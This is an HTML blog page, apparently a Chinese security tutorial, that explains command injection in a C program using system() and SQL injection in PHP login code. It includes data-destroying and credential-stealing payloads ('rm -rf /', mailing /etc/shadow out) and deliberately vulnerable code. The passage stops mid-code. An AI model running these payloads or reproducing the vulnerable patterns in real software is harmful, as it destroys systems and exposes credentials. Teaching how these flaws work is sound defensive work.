@@ -1,0 +1,665 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"fenlan.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"disqus","storage":true,"lazyload":false,"nav":null,"activeClass":"disqus"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="c程序代码注入c程序:123456789101112131415#include &lt;stdio.h&gt;int main(int argc, char *argv[])&amp;#123;	char src[100], dst[100], cmd[205] &#x3D; &quot;cp &quot;;	printf(&quot;Please enter name of source file:&quot;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="代码注入">
+<meta property="og:url" content="http://fenlan.github.io/2017/12/14/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="fenlan">
+<meta property="og:description" content="c程序代码注入c程序:123456789101112131415#include &lt;stdio.h&gt;int main(int argc, char *argv[])&amp;#123;	char src[100], dst[100], cmd[205] &#x3D; &quot;cp &quot;;	printf(&quot;Please enter name of source file:&quot;">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://fenlan.github.io/images/attacks.png">
+<meta property="og:image" content="http://fenlan.github.io/images/attacks2.png">
+<meta property="og:image" content="http://fenlan.github.io/images/sql1.png">
+<meta property="og:image" content="http://fenlan.github.io/images/sql2.png">
+<meta property="og:image" content="http://fenlan.github.io/images/sql3.png">
+<meta property="og:image" content="http://fenlan.github.io/images/sql4.png">
+<meta property="og:image" content="http://fenlan.github.io/images/sql5.png">
+<meta property="og:image" content="http://fenlan.github.io/images/sql6.png">
+<meta property="og:image" content="http://fenlan.github.io/images/sql7.png">
+<meta property="article:published_time" content="2017-12-14T07:18:23.000Z">
+<meta property="article:modified_time" content="2023-01-18T08:50:41.342Z">
+<meta property="article:author" content="Gao Jie">
+<meta property="article:tag" content="centos">
+<meta property="article:tag" content="代码注入">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://fenlan.github.io/images/attacks.png">
+
+<link rel="canonical" href="http://fenlan.github.io/2017/12/14/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>代码注入 | fenlan</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">fenlan</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">Everything gonna be fine in the end, if it's not fine, it's not the end.</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://fenlan.github.io/2017/12/14/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Gao Jie">
+      <meta itemprop="description" content="Everything gonna be fine in the end">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="fenlan">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          代码注入
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2017-12-14 15:18:23" itemprop="dateCreated datePublished" datetime="2017-12-14T15:18:23+08:00">2017-12-14</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-01-18 16:50:41" itemprop="dateModified" datetime="2023-01-18T16:50:41+08:00">2023-01-18</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">安全</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus：</span>
+    
+    <a title="disqus" href="/2017/12/14/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2017/12/14/代码注入/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="c程序代码注入"><a href="#c程序代码注入" class="headerlink" title="c程序代码注入"></a>c程序代码注入</h2><p>c程序:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"></span><br><span class="line">int main(int argc, char *argv[])</span><br><span class="line">&#123;</span><br><span class="line">	char src[100], dst[100], cmd[205] = <span class="string">&quot;cp &quot;</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Please enter name of source file:&quot;</span>);</span><br><span class="line">	gets(src);</span><br><span class="line">	strcat(cmd, src);</span><br><span class="line">	strcat(cmd, <span class="string">&quot; &quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Please enter name of destination file:&quot;</span>);</span><br><span class="line">	gets(dst);</span><br><span class="line">	strcat(cmd, dst);</span><br><span class="line">	system(cmd);</span><br><span class="line">	<span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><span id="more"></span><br>程序本身是要求输入一个拷贝源文件和拷贝目标文件，将源文件内容拷贝到目标文件,正常执行:<br><img src="/images/attacks.png" alt=""></p>
+<p>异常代码注入<br><img src="/images/attacks2.png" alt=""></p>
+<p>同时还能干这些事情<br>删除根目录，你可以试试<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp hello world; rm -rf / --no-preserve-root</span><br></pre></td></tr></table></figure><br>将linux系统的密码文件通过邮件发送<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp hello world; mail ****@****.com &lt; /etc/shadow</span><br></pre></td></tr></table></figure></p>
+<h2 id="SQL代码注入"><a href="#SQL代码注入" class="headerlink" title="SQL代码注入"></a>SQL代码注入</h2><p><code>index.html</code><br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/css/bootstrap.min.css&quot;</span> <span class="attr">integrity</span>=<span class="string">&quot;sha384-PsH8R72JQ3SOdhVi3uxftmaW6Vc51MKb0q5P2rRUpPvrszuE4W1povHYgTpBfshb&quot;</span> <span class="attr">crossorigin</span>=<span class="string">&quot;anonymous&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://code.jquery.com/jquery-3.2.1.slim.min.js&quot;</span> <span class="attr">integrity</span>=<span class="string">&quot;sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN&quot;</span> <span class="attr">crossorigin</span>=<span class="string">&quot;anonymous&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.3/umd/popper.min.js&quot;</span> <span class="attr">integrity</span>=<span class="string">&quot;sha384-vFJXuSJphROIrBnz7yo7oB41mKfc8JzQZiCq4NCceLEaO4IHwicKwpJf9c9IpFgh&quot;</span> <span class="attr">crossorigin</span>=<span class="string">&quot;anonymous&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/js/bootstrap.min.js&quot;</span> <span class="attr">integrity</span>=<span class="string">&quot;sha384-alpBpkh1PFOepccYVYDB4do5UnbKysX5WZXm3XxPqe5iKTfUKjNkCk9SaVuEZflJ&quot;</span> <span class="attr">crossorigin</span>=<span class="string">&quot;anonymous&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>sql 注入测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;card&quot;</span> <span class="attr">style</span>=<span class="string">&quot;width: 20rem;&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;card-body&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">action</span>=<span class="string">&quot;index.php&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form-group&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">&quot;col-form-label&quot;</span> <span class="attr">for</span>=<span class="string">&quot;formGroupExampleInput&quot;</span>&gt;</span>SQL query<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">class</span>=<span class="string">&quot;form-control&quot;</span> <span class="attr">name</span>=<span class="string">&quot;content&quot;</span> <span class="attr">id</span>=<span class="string">&quot;content&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;Example input&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-primary&quot;</span>&gt;</span>Submit<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><br><code>index.php</code><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">        &lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/css/bootstrap.min.css&quot;</span> integrity=<span class="string">&quot;sha384-PsH8R72JQ3SOdhVi3uxftmaW6Vc51MKb0q5P2rRUpPvrszuE4W1povHYgTpBfshb&quot;</span> crossorigin=<span class="string">&quot;anonymous&quot;</span>&gt;</span><br><span class="line">        &lt;script src=<span class="string">&quot;https://code.jquery.com/jquery-3.2.1.slim.min.js&quot;</span> integrity=<span class="string">&quot;sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN&quot;</span> crossorigin=<span class="string">&quot;anonymous&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">        &lt;script src=<span class="string">&quot;https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.3/umd/popper.min.js&quot;</span> integrity=<span class="string">&quot;sha384-vFJXuSJphROIrBnz7yo7oB41mKfc8JzQZiCq4NCceLEaO4IHwicKwpJf9c9IpFgh&quot;</span> crossorigin=<span class="string">&quot;anonymous&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">        &lt;script src=<span class="string">&quot;https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/js/bootstrap.min.js&quot;</span> integrity=<span class="string">&quot;sha384-alpBpkh1PFOepccYVYDB4do5UnbKysX5WZXm3XxPqe5iKTfUKjNkCk9SaVuEZflJ&quot;</span> crossorigin=<span class="string">&quot;anonymous&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">        &lt;title&gt;SQL 注入&lt;/title&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        <span class="meta">&lt;?php</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$_POST</span>[content]) &#123;</span><br><span class="line">            <span class="variable">$db_host</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line">            <span class="variable">$db_user</span> = <span class="string">&quot;my_user&quot;</span>;</span><br><span class="line">            <span class="variable">$db_password</span> = <span class="string">&quot;my_password&quot;</span>;</span><br><span class="line">            <span class="variable">$db_name</span> = <span class="string">&quot;my_db&quot;</span>;</span><br><span class="line">            <span class="variable">$content</span> = <span class="variable">$_POST</span>[content];</span><br><span class="line">            <span class="variable">$query</span> = <span class="string">&quot;SELECT * FROM users WHERE name = &#x27;<span class="subst">$content</span>&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$conn</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="variable">$db_host</span>,<span class="variable">$db_user</span>,<span class="variable">$db_password</span>,<span class="variable">$db_name</span>);</span><br><span class="line">            <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>, <span class="variable">$query</span>);</span><br><span class="line"></span><br><span class="line">            <span class="title function_ invoke__">var_dump</span>();</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">mysqli_num_rows</span>(<span class="variable">$result</span>)) &#123;</span><br><span class="line">                <span class="keyword">while</span> (<span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$result</span>)) &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;Your name is &quot;</span> . <span class="variable">$row</span>[<span class="number">1</span>] . <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;No Found!&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$conn</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="title function_ invoke__">var_dump</span>(<span class="variable">$_POST</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Don&#x27;t get your content!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">?&gt;</span></span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><br>表中数据<br><img src="/images/sql1.png" alt=""><br>正常输入<br><img src="/images/sql2.png" alt=""><br><img src="/images/sql3.png" alt=""><br><img src="/images/sql4.png" alt=""><br><img src="/images/sql5.png" alt=""><br>异常输入<br><img src="/images/sql6.png" alt=""><br><img src="/images/sql7.png" alt=""></p>
+<p>问题在于<code>SELECT * FROM users WHERE name = &#39;$content&#39;</code>在接收前端输入的字符串时，直接拼接查询语句,当输入为<code>hello&#39; OR 1=1 #</code>时,将语句拼接完成就是<code>SELECT * FROM users WHERE name = &#39;hello&#39; OR 1=1 #&#39;</code>,其中<code>hello</code>后的一个单引号将查询语句的第一个单引号关闭了,接下来就是<code>OR</code>语句的真子句,最后将多余的单引号注释掉,那么这个查询永远为真,查询语句就会将数据库中所有的数据都返回。</p>
+<h2 id="SQL注入续"><a href="#SQL注入续" class="headerlink" title="SQL注入续"></a>SQL注入续</h2><p><code>low.php</code><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$db_host</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$db_user</span> = <span class="string">&quot;my_user&quot;</span>;</span><br><span class="line"><span class="variable">$db_password</span> = <span class="string">&quot;my_password&quot;</span>;</span><br><span class="line"><span class="variable">$db_name</span> = <span class="string">&quot;my_db&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span> = <span class="variable">$_POST</span>[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="variable">$pass</span> = <span class="variable">$_POST</span>[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line"><span class="variable">$pass</span> = <span class="title function_ invoke__">md5</span>( <span class="variable">$pass</span> );</span><br><span class="line"></span><br><span class="line"><span class="variable">$query</span>  = <span class="string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="subst">$user</span>&#x27; AND password = &#x27;<span class="subst">$pass</span>&#x27;;&quot;</span>;</span><br><span class="line"><span class="variable">$conn</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="variable">$db_host</span>,<span class="variable">$db_user</span>,<span class="variable">$db_password</span>,<span class="variable">$db_name</span>);</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>, <span class="variable">$query</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="variable">$result</span> &amp;&amp; <span class="title function_ invoke__">mysqli_num_rows</span>( <span class="variable">$result</span> ) == <span class="number">1</span> ) &#123;</span><br><span class="line">	<span class="variable">$row</span>    = <span class="title function_ invoke__">mysqli_fetch_assoc</span>( <span class="variable">$result</span> );</span><br><span class="line">	<span class="variable">$avatar</span> = <span class="variable">$row</span>[<span class="string">&quot;avatar&quot;</span>];</span><br><span class="line"></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Welcome to the password protected area <span class="subst">&#123;$user&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;img src=\&quot;<span class="subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$conn</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p><code>medium.php</code><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$db_host</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$db_user</span> = <span class="string">&quot;my_user&quot;</span>;</span><br><span class="line"><span class="variable">$db_password</span> = <span class="string">&quot;my_password&quot;</span>;</span><br><span class="line"><span class="variable">$db_name</span> = <span class="string">&quot;my_db&quot;</span>;</span><br><span class="line"><span class="variable">$conn</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="variable">$db_host</span>,<span class="variable">$db_user</span>,<span class="variable">$db_password</span>,<span class="variable">$db_name</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span> = <span class="variable">$_POST</span>[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="variable">$pass</span> = <span class="variable">$_POST</span>[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line"><span class="variable">$user</span> = <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$conn</span>, <span class="variable">$user</span>);</span><br><span class="line"><span class="variable">$pass</span> = <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$conn</span>, <span class="variable">$pass</span>);</span><br><span class="line"><span class="variable">$pass</span> = <span class="title function_ invoke__">md5</span>( <span class="variable">$pass</span> );</span><br><span class="line"></span><br><span class="line"><span class="variable">$query</span>  = <span class="string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="subst">$user</span>&#x27; AND password = &#x27;<span class="subst">$pass</span>&#x27;;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>, <span class="variable">$query</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( 